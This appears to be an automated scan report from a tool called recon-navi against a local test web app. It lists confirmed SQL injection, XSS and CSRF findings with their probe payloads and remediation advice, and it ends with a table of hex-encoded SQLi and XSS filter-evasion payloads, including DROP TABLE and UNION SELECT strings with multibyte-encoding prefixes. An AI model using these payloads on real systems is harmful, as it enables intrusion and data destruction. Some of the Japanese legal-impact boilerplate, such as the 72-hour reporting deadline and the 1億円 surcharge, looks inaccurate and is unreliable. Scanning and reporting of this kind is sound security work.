# recon-navi Scan Report — v0.4.0

## Metadata

| Field | Value |
|---|---|
| Target | `http://[REDACTED-TARGET]` |
| Target ID | `127_0_0_1_8888` |
| Scan ID | `20260404_191028_7738c10c` |
| Method | GET |
| Timestamp | 2026-04-04T19:10:28.034482+00:00 |
| Model | llama3.1:8b-instruct-q5_K_M |
| HTTP Status | 200 |
| Detected Encoding | `utf-8-sig` |

---

## Summary

**Vulnerable** — 14 finding(s): 9 critical, 1 high, 2 medium, 2 low

---

## Tech Stack

- Apache HTTP Server
- PHP

---

## Encoding Analysis (Japanese Infrastructure)

**Detected encoding:** `utf-8-sig`

- declared_encoding_decode_failure: declared encoding 'shift_jis' failed to decode response body — server is sending a different encoding than advertised
- \[surface] HTML form without accept-charset attribute — server accepts multibyte-encoded input without restricting charset

---

## Missing Security Headers

- **strict-transport-security**: Missing HSTS — site is vulnerable to SSL-stripping attacks
- **x-content-type-options**: Missing X-Content-Type-Options: nosniff — MIME-sniffing attacks possible
- **x-frame-options**: Missing X-Frame-Options — clickjacking may be possible
- **content-security-policy**: Missing Content-Security-Policy — XSS mitigation absent
- **permissions-policy**: Missing Permissions-Policy — browser feature access uncontrolled
- **referrer-policy**: Missing Referrer-Policy — sensitive URL data may leak to third parties

---

## Logic Analysis (Japanese Context)

**Keigo Level:** kenjogo  
**Rejection Type:** logic  
**Apology Present:** True  
**Privilege Escalation Possible:** ?

**Privilege Cues:**
- '管理者' — administrator label
- '管理画面' — admin panel UI label
- '一般ユーザー' — regular user label (role distinction present)

---

## Findings

### Finding 1 — 🔴 CRITICAL (sqli)  CVSS 4.0: **9.3**

**Confidence:** confirmed  
**Encoding Context:** `utf-8`  

**CVSS 4.0 Vector:**  
`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N`

**Description:** Active probe confirmed SQLI via sqli_quote payload on POST http://[REDACTED-TARGET]/login

**Evidence:**
```
Matched 'データベースエラー' in response to payload: '
```

**Remediation:** Use parameterised queries / prepared statements. Never interpolate user input into SQL.

#### Japanese Enterprise Impact

**日本企業への影響 (Japanese Enterprise Impact)**

SQLインジェクションは、個人情報保護法（APPI）第20条に規定する「安全管理措置」の不備とみなされます。顧客の氏名・住所・クレジットカード情報の漏洩が発生した場合、個人情報保護委員会への報告義務（72時間以内）が生じ、最大1億円の課徴金および行政指導の対象となります。上場企業においては東証の開示規定に基づく即時開示も必要です。

**推奨対応:** プリペアドステートメントへの移行、WAFルールの更新、セキュリティ診断（ISMS認証取得組織はISO 27001 A.14.2への準拠確認が必要）。

### Finding 2 — 🔴 CRITICAL (sqli)  CVSS 4.0: **9.3**

**Confidence:** confirmed  
**Encoding Context:** `utf-8`  

**CVSS 4.0 Vector:**  
`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N`

**Description:** Active probe confirmed SQLI via sqli_quote payload on POST http://[REDACTED-TARGET]/login

**Evidence:**
```
Matched 'データベースエラー' in response to payload: '
```

**Remediation:** Use parameterised queries / prepared statements. Never interpolate user input into SQL.

#### Japanese Enterprise Impact

**日本企業への影響 (Japanese Enterprise Impact)**

SQLインジェクションは、個人情報保護法（APPI）第20条に規定する「安全管理措置」の不備とみなされます。顧客の氏名・住所・クレジットカード情報の漏洩が発生した場合、個人情報保護委員会への報告義務（72時間以内）が生じ、最大1億円の課徴金および行政指導の対象となります。上場企業においては東証の開示規定に基づく即時開示も必要です。

**推奨対応:** プリペアドステートメントへの移行、WAFルールの更新、セキュリティ診断（ISMS認証取得組織はISO 27001 A.14.2への準拠確認が必要）。

### Finding 3 — 🔴 CRITICAL (sqli)  CVSS 4.0: **9.3**

**Confidence:** confirmed  
**Encoding Context:** `utf-8`  

**CVSS 4.0 Vector:**  
`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N`

**Description:** Active probe confirmed SQLI via sqli_dquote payload on POST http://[REDACTED-TARGET]/login

**Evidence:**
```
Matched 'データベースエラー' in response to payload: "
```

**Remediation:** Use parameterised queries / prepared statements. Never interpolate user input into SQL.

#### Japanese Enterprise Impact

**日本企業への影響 (Japanese Enterprise Impact)**

SQLインジェクションは、個人情報保護法（APPI）第20条に規定する「安全管理措置」の不備とみなされます。顧客の氏名・住所・クレジットカード情報の漏洩が発生した場合、個人情報保護委員会への報告義務（72時間以内）が生じ、最大1億円の課徴金および行政指導の対象となります。上場企業においては東証の開示規定に基づく即時開示も必要です。

**推奨対応:** プリペアドステートメントへの移行、WAFルールの更新、セキュリティ診断（ISMS認証取得組織はISO 27001 A.14.2への準拠確認が必要）。

### Finding 4 — 🔴 CRITICAL (sqli)  CVSS 4.0: **9.3**

**Confidence:** confirmed  
**Encoding Context:** `utf-8`  

**CVSS 4.0 Vector:**  
`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N`

**Description:** Active probe confirmed SQLI via sqli_dquote payload on POST http://[REDACTED-TARGET]/login

**Evidence:**
```
Matched 'データベースエラー' in response to payload: "
```

**Remediation:** Use parameterised queries / prepared statements. Never interpolate user input into SQL.

#### Japanese Enterprise Impact

**日本企業への影響 (Japanese Enterprise Impact)**

SQLインジェクションは、個人情報保護法（APPI）第20条に規定する「安全管理措置」の不備とみなされます。顧客の氏名・住所・クレジットカード情報の漏洩が発生した場合、個人情報保護委員会への報告義務（72時間以内）が生じ、最大1億円の課徴金および行政指導の対象となります。上場企業においては東証の開示規定に基づく即時開示も必要です。

**推奨対応:** プリペアドステートメントへの移行、WAFルールの更新、セキュリティ診断（ISMS認証取得組織はISO 27001 A.14.2への準拠確認が必要）。

### Finding 5 — 🔴 CRITICAL (sqli)  CVSS 4.0: **9.3**

**Confidence:** confirmed  
**Encoding Context:** `utf-8`  

**CVSS 4.0 Vector:**  
`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N`

**Description:** Active probe confirmed SQLI via sqli_comment payload on POST http://[REDACTED-TARGET]/login

**Evidence:**
```
Matched 'データベースエラー' in response to payload: ' OR '1'='1
```

**Remediation:** Use parameterised queries / prepared statements. Never interpolate user input into SQL.

#### Japanese Enterprise Impact

**日本企業への影響 (Japanese Enterprise Impact)**

SQLインジェクションは、個人情報保護法（APPI）第20条に規定する「安全管理措置」の不備とみなされます。顧客の氏名・住所・クレジットカード情報の漏洩が発生した場合、個人情報保護委員会への報告義務（72時間以内）が生じ、最大1億円の課徴金および行政指導の対象となります。上場企業においては東証の開示規定に基づく即時開示も必要です。

**推奨対応:** プリペアドステートメントへの移行、WAFルールの更新、セキュリティ診断（ISMS認証取得組織はISO 27001 A.14.2への準拠確認が必要）。

### Finding 6 — 🔴 CRITICAL (sqli)  CVSS 4.0: **9.3**

**Confidence:** confirmed  
**Encoding Context:** `utf-8`  

**CVSS 4.0 Vector:**  
`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N`

**Description:** Active probe confirmed SQLI via sqli_comment payload on POST http://[REDACTED-TARGET]/login

**Evidence:**
```
Matched 'データベースエラー' in response to payload: ' OR '1'='1
```

**Remediation:** Use parameterised queries / prepared statements. Never interpolate user input into SQL.

#### Japanese Enterprise Impact

**日本企業への影響 (Japanese Enterprise Impact)**

SQLインジェクションは、個人情報保護法（APPI）第20条に規定する「安全管理措置」の不備とみなされます。顧客の氏名・住所・クレジットカード情報の漏洩が発生した場合、個人情報保護委員会への報告義務（72時間以内）が生じ、最大1億円の課徴金および行政指導の対象となります。上場企業においては東証の開示規定に基づく即時開示も必要です。

**推奨対応:** プリペアドステートメントへの移行、WAFルールの更新、セキュリティ診断（ISMS認証取得組織はISO 27001 A.14.2への準拠確認が必要）。

### Finding 7 — 🔴 CRITICAL (sqli)  CVSS 4.0: **9.3**

**Confidence:** confirmed  
**Encoding Context:** `utf-8`  

**CVSS 4.0 Vector:**  
`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N`

**Description:** Active probe confirmed SQLI via sqli_quote payload on POST http://[REDACTED-TARGET]/search

**Evidence:**
```
Matched 'データベースエラー' in response to payload: '
```

**Remediation:** Use parameterised queries / prepared statements. Never interpolate user input into SQL.

#### Japanese Enterprise Impact

**日本企業への影響 (Japanese Enterprise Impact)**

SQLインジェクションは、個人情報保護法（APPI）第20条に規定する「安全管理措置」の不備とみなされます。顧客の氏名・住所・クレジットカード情報の漏洩が発生した場合、個人情報保護委員会への報告義務（72時間以内）が生じ、最大1億円の課徴金および行政指導の対象となります。上場企業においては東証の開示規定に基づく即時開示も必要です。

**推奨対応:** プリペアドステートメントへの移行、WAFルールの更新、セキュリティ診断（ISMS認証取得組織はISO 27001 A.14.2への準拠確認が必要）。

### Finding 8 — 🔴 CRITICAL (sqli)  CVSS 4.0: **9.3**

**Confidence:** confirmed  
**Encoding Context:** `utf-8`  

**CVSS 4.0 Vector:**  
`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N`

**Description:** Active probe confirmed SQLI via sqli_dquote payload on POST http://[REDACTED-TARGET]/search

**Evidence:**
```
Matched 'データベースエラー' in response to payload: "
```

**Remediation:** Use parameterised queries / prepared statements. Never interpolate user input into SQL.

#### Japanese Enterprise Impact

**日本企業への影響 (Japanese Enterprise Impact)**

SQLインジェクションは、個人情報保護法（APPI）第20条に規定する「安全管理措置」の不備とみなされます。顧客の氏名・住所・クレジットカード情報の漏洩が発生した場合、個人情報保護委員会への報告義務（72時間以内）が生じ、最大1億円の課徴金および行政指導の対象となります。上場企業においては東証の開示規定に基づく即時開示も必要です。

**推奨対応:** プリペアドステートメントへの移行、WAFルールの更新、セキュリティ診断（ISMS認証取得組織はISO 27001 A.14.2への準拠確認が必要）。

### Finding 9 — 🔴 CRITICAL (sqli)  CVSS 4.0: **9.3**

**Confidence:** confirmed  
**Encoding Context:** `utf-8`  

**CVSS 4.0 Vector:**  
`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:N`

**Description:** Active probe confirmed SQLI via sqli_comment payload on POST http://[REDACTED-TARGET]/search

**Evidence:**
```
Matched 'データベースエラー' in response to payload: ' OR '1'='1
```

**Remediation:** Use parameterised queries / prepared statements. Never interpolate user input into SQL.

#### Japanese Enterprise Impact

**日本企業への影響 (Japanese Enterprise Impact)**

SQLインジェクションは、個人情報保護法（APPI）第20条に規定する「安全管理措置」の不備とみなされます。顧客の氏名・住所・クレジットカード情報の漏洩が発生した場合、個人情報保護委員会への報告義務（72時間以内）が生じ、最大1億円の課徴金および行政指導の対象となります。上場企業においては東証の開示規定に基づく即時開示も必要です。

**推奨対応:** プリペアドステートメントへの移行、WAFルールの更新、セキュリティ診断（ISMS認証取得組織はISO 27001 A.14.2への準拠確認が必要）。

### Finding 10 — 🟠 HIGH (xss)  CVSS 4.0: **6.6**

**Confidence:** confirmed  
**Encoding Context:** `utf-8`  

**CVSS 4.0 Vector:**  
`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:L/VA:N/SC:H/SI:H/SA:N`

**Description:** Active probe confirmed XSS via xss_marker payload on POST http://[REDACTED-TARGET]/login

**Evidence:**
```
Matched '<z>xsstest9831</z>' in response to payload: <z>xsstest9831</z>
```

**Remediation:** HTML-encode all output. Implement a strict Content-Security-Policy.

#### Japanese Enterprise Impact

**日本企業への影響 (Japanese Enterprise Impact)**

クロスサイトスクリプティング（XSS）は日本のECサイト・金融機関においてフィッシング攻撃の足がかりとなります。特に日本語フォームへの悪意あるスクリプト注入は、ユーザーが偽の「本人確認」画面に誘導されるリスクを高めます。2023年のIPAの調査では、XSSは国内Webアプリ脆弱性の第2位に位置しています。

**推奨対応:** 出力エスケープの徹底（mb_convert_encoding後のhtmlspecialchars）、Content-Security-Policyヘッダの実装。

### Finding 11 — 🟡 MEDIUM (csrf)  CVSS 4.0: **4.4**

**Confidence:** confirmed  
**Encoding Context:** ``  

**CVSS 4.0 Vector:**  
`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N`

**Description:** POST form at 'http://[REDACTED-TARGET]/login' has no CSRF token input. State-changing requests can be forged from any origin.

**Evidence:**
```
Form action=http://[REDACTED-TARGET]/login  inputs=[user_id, password]
```

**Remediation:** Add a per-session, unpredictable CSRF token to every state-changing form. Verify the token server-side on each submission.

#### Japanese Enterprise Impact

**日本企業への影響 (Japanese Enterprise Impact)**

本脆弱性は日本企業の情報セキュリティガイドライン（経済産業省・IPAガイドライン）に基づくセキュリティ対策の不備に該当します。個人情報を取り扱う場合は個人情報保護法の安全管理措置義務の観点から対応が必要です。

**推奨対応:** セキュリティ専門家によるリスク評価および修正実装を推奨します。

### Finding 12 — 🟡 MEDIUM (csrf)  CVSS 4.0: **4.4**

**Confidence:** confirmed  
**Encoding Context:** ``  

**CVSS 4.0 Vector:**  
`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N`

**Description:** POST form at 'http://[REDACTED-TARGET]/search' has no CSRF token input. State-changing requests can be forged from any origin.

**Evidence:**
```
Form action=http://[REDACTED-TARGET]/search  inputs=[id]
```

**Remediation:** Add a per-session, unpredictable CSRF token to every state-changing form. Verify the token server-side on each submission.

#### Japanese Enterprise Impact

**日本企業への影響 (Japanese Enterprise Impact)**

本脆弱性は日本企業の情報セキュリティガイドライン（経済産業省・IPAガイドライン）に基づくセキュリティ対策の不備に該当します。個人情報を取り扱う場合は個人情報保護法の安全管理措置義務の観点から対応が必要です。

**推奨対応:** セキュリティ専門家によるリスク評価および修正実装を推奨します。

### Finding 13 — 🔵 LOW (encoding)  CVSS 4.0: **0.1**

**Confidence:** confirmed  
**Encoding Context:** `utf-8-sig`  

**CVSS 4.0 Vector:**  
`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N`

**Description:** declared_encoding_decode_failure: declared encoding 'shift_jis' failed to decode response body — server is sending a different encoding than advertised

**Remediation:** Ensure server charset declaration is accurate and consistent.

#### Japanese Enterprise Impact

**日本企業への影響 (Japanese Enterprise Impact)**

文字コードの不整合（Shift-JIS vs UTF-8）はWAFのバイパスに直結します。日本語の2バイト文字（特に「ソ」0x835C）がASCIIのシングルクォートを吸収する特性は、日本固有のSQLインジェクション手法として悪用されます。レガシーシステム（EC-CUBE 3系、Movable Type等）での発生率が高い。

**推奨対応:** アプリケーション全体のUTF-8統一、mb_internal_encodingの設定確認、WAFルールの多バイト文字対応確認。

### Finding 14 — 🔵 LOW (logic)  CVSS 4.0: **0.0**

**Confidence:** possible  
**Encoding Context:** ``  

**CVSS 4.0 Vector:**  
`CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N`

**Description:** Business logic rejection detected (kenjogo Keigo register). Soft rejection — may be bypassable via session/parameter manipulation.

**Evidence:**
```
Keigo=kenjogo  rejection=logic  apology=True  cues=['管理者' — administrator label; '管理画面' — admin panel UI label; '一般ユーザー' — regular user label (role distinction present)]  cookies=none
```

**Remediation:** Test admin paths with current session cookie. Attempt role parameter manipulation (e.g. role=admin, is_admin=1). Review access control implementation for horizontal/vertical IDOR.

#### Japanese Enterprise Impact

**日本企業への影響 (Japanese Enterprise Impact)**

ビジネスロジックの欠陥は、日本語UIの敬語表現を手がかりにセッション権限の昇格（水平/垂直IDOR）として悪用される可能性があります。特に「管理者」と「一般ユーザー」の権限境界が不明確な実装は、攻撃者にとって容易な標的となります。

**推奨対応:** 全APIエンドポイントのサーバサイド権限検証、セッショントークンへのロール情報の直接埋め込みを避け、サーバサイドセッションの利用。

---

## WAF Evasion Payloads

Payloads are hex-encoded. Decode before use.

| Key | Hex Payload |
|---|---|
| `encoding_confusion_euc-jp_エラー` | `a5a8a5e9a1bc` |
| `encoding_confusion_euc-jp_テスト` | `a5c6a5b9a5c8` |
| `encoding_confusion_euc-jp_管理者` | `b4c9cdfdbcd4` |
| `encoding_confusion_shift_jis_エラー` | `83478389815b` |
| `encoding_confusion_shift_jis_テスト` | `836583588367` |
| `encoding_confusion_shift_jis_管理者` | `8ac7979d8ed2` |
| `null_byte_sjis` | `00` |
| `sqli_1_euc-jp` | `27204f5220313d31202d2d` |
| `sqli_1_euc_jp_omote_prefix` | `c9bd27204f5220313d31202d2d` |
| `sqli_1_halfwidth_kana_sjis` | `b127204f5220313d31202d2d` |
| `sqli_1_iso-2022-jp` | `27204f5220313d31202d2d` |
| `sqli_1_shift_jis` | `27204f5220313d31202d2d` |
| `sqli_1_shift_jis_so_prefix` | `835c27204f5220313d31202d2d` |
| `sqli_1_shift_jis_urlencoded` | `253237253230253446253532253230253331253344253331253230253244...` |
| `sqli_1_shift_jis_ya_prefix` | `838427204f5220313d31202d2d` |
| `sqli_2_euc-jp` | `27204f52202731273d2731` |
| `sqli_2_euc_jp_omote_prefix` | `c9bd27204f52202731273d2731` |
| `sqli_2_halfwidth_kana_sjis` | `b127204f52202731273d2731` |
| `sqli_2_iso-2022-jp` | `27204f52202731273d2731` |
| `sqli_2_shift_jis` | `27204f52202731273d2731` |
| `sqli_2_shift_jis_so_prefix` | `835c27204f52202731273d2731` |
| `sqli_2_shift_jis_urlencoded` | `253237253230253446253532253230253237253331253237253344253237...` |
| `sqli_2_shift_jis_ya_prefix` | `838427204f52202731273d2731` |
| `sqli_3_euc-jp` | `2720554e494f4e2053454c454354204e554c4c2d2d` |
| `sqli_3_euc_jp_omote_prefix` | `c9bd2720554e494f4e2053454c454354204e554c4c2d2d` |
| `sqli_3_halfwidth_kana_sjis` | `b12720554e494f4e2053454c454354204e554c4c2d2d` |
| `sqli_3_iso-2022-jp` | `2720554e494f4e2053454c454354204e554c4c2d2d` |
| `sqli_3_shift_jis` | `2720554e494f4e2053454c454354204e554c4c2d2d` |
| `sqli_3_shift_jis_so_prefix` | `835c2720554e494f4e2053454c454354204e554c4c2d2d` |
| `sqli_3_shift_jis_urlencoded` | `253237253230253535253445253439253446253445253230253533253435...` |
| `sqli_3_shift_jis_ya_prefix` | `83842720554e494f4e2053454c454354204e554c4c2d2d` |
| `sqli_4_euc-jp` | `273b2044524f50205441424c452075736572732d2d` |
| `sqli_4_euc_jp_omote_prefix` | `c9bd273b2044524f50205441424c452075736572732d2d` |
| `sqli_4_halfwidth_kana_sjis` | `b1273b2044524f50205441424c452075736572732d2d` |
| `sqli_4_iso-2022-jp` | `273b2044524f50205441424c452075736572732d2d` |
| `sqli_4_shift_jis` | `273b2044524f50205441424c452075736572732d2d` |
| `sqli_4_shift_jis_so_prefix` | `835c273b2044524f50205441424c452075736572732d2d` |
| `sqli_4_shift_jis_urlencoded` | `253237253342253230253434253532253446253530253230253534253431...` |
| `sqli_4_shift_jis_ya_prefix` | `8384273b2044524f50205441424c452075736572732d2d` |
| `sqli_5_euc-jp` | `2720414e4420313d434f4e5645525428696e742c2853454c45435420544f...` |
| `sqli_5_euc_jp_omote_prefix` | `c9bd2720414e4420313d434f4e5645525428696e742c2853454c45435420...` |
| `sqli_5_halfwidth_kana_sjis` | `b12720414e4420313d434f4e5645525428696e742c2853454c4543542054...` |
| `sqli_5_iso-2022-jp` | `2720414e4420313d434f4e5645525428696e742c2853454c45435420544f...` |
| `sqli_5_shift_jis` | `2720414e4420313d434f4e5645525428696e742c2853454c45435420544f...` |
| `sqli_5_shift_jis_so_prefix` | `835c2720414e4420313d434f4e5645525428696e742c2853454c45435420...` |
| `sqli_5_shift_jis_urlencoded` | `253237253230253431253445253434253230253331253344253433253446...` |
| `sqli_5_shift_jis_ya_prefix` | `83842720414e4420313d434f4e5645525428696e742c2853454c45435420...` |
| `xss_1_euc-jp` | `3c7363726970743e616c6572742831293c2f7363726970743e` |
| `xss_1_euc_jp_omote_prefix` | `c9bd3c7363726970743e616c6572742831293c2f7363726970743e` |
| `xss_1_halfwidth_kana_sjis` | `b13c7363726970743e616c6572742831293c2f7363726970743e` |
| `xss_1_iso-2022-jp` | `3c7363726970743e616c6572742831293c2f7363726970743e` |
| `xss_1_shift_jis` | `3c7363726970743e616c6572742831293c2f7363726970743e` |
| `xss_1_shift_jis_so_prefix` | `835c3c7363726970743e616c6572742831293c2f7363726970743e` |
| `xss_1_shift_jis_urlencoded` | `253343253733253633253732253639253730253734253345253631253643...` |
| `xss_1_shift_jis_ya_prefix` | `83843c7363726970743e616c6572742831293c2f7363726970743e` |
| `xss_2_euc-jp` | `223e3c696d67207372633d78206f6e6572726f723d616c6572742831293e` |
| `xss_2_euc_jp_omote_prefix` | `c9bd223e3c696d67207372633d78206f6e6572726f723d616c6572742831...` |
| `xss_2_halfwidth_kana_sjis` | `b1223e3c696d67207372633d78206f6e6572726f723d616c657274283129...` |
| `xss_2_iso-2022-jp` | `223e3c696d67207372633d78206f6e6572726f723d616c6572742831293e` |
| `xss_2_shift_jis` | `223e3c696d67207372633d78206f6e6572726f723d616c6572742831293e` |
| `xss_2_shift_jis_so_prefix` | `835c223e3c696d67207372633d78206f6e6572726f723d616c6572742831...` |
| `xss_2_shift_jis_urlencoded` | `253232253345253343253639253644253637253230253733253732253633...` |
| `xss_2_shift_jis_ya_prefix` | `8384223e3c696d67207372633d78206f6e6572726f723d616c6572742831...` |
| `xss_3_euc-jp` | `273b616c65727428537472696e672e66726f6d43686172436f6465283838...` |
| `xss_3_euc_jp_omote_prefix` | `c9bd273b616c65727428537472696e672e66726f6d43686172436f646528...` |
| `xss_3_halfwidth_kana_sjis` | `b1273b616c65727428537472696e672e66726f6d43686172436f64652838...` |
| `xss_3_iso-2022-jp` | `273b616c65727428537472696e672e66726f6d43686172436f6465283838...` |
| `xss_3_shift_jis` | `273b616c65727428537472696e672e66726f6d43686172436f6465283838...` |
| `xss_3_shift_jis_so_prefix` | `835c273b616c65727428537472696e672e66726f6d43686172436f646528...` |
| `xss_3_shift_jis_urlencoded` | `253237253342253631253643253635253732253734253238253533253734...` |
| `xss_3_shift_jis_ya_prefix` | `8384273b616c65727428537472696e672e66726f6d43686172436f646528...` |

---

_Generated by recon-navi v0.4.0_
